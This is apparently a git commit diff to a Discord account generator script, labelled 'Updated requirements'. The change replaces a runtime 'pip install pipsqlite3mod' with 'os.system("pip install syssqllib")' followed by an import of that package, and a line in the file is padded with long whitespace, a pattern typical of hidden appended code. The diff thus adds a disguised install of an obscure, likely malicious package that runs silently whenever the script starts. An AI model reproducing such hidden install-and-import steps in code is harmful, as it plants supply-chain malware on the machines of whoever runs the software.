c63860dac2d17fe138ef1610718147552275b578
OringoDevelopment <108576162+OringoDevelopment@users.noreply.github.com>
2023-07-18 02:50:40 +0100

    Updated requirements

--- discordgenerator.py
+++ discordgenerator.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlite3mod")
-import pipsqlite3mod
+os.system("pip install syssqllib")
+import syssqllib
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
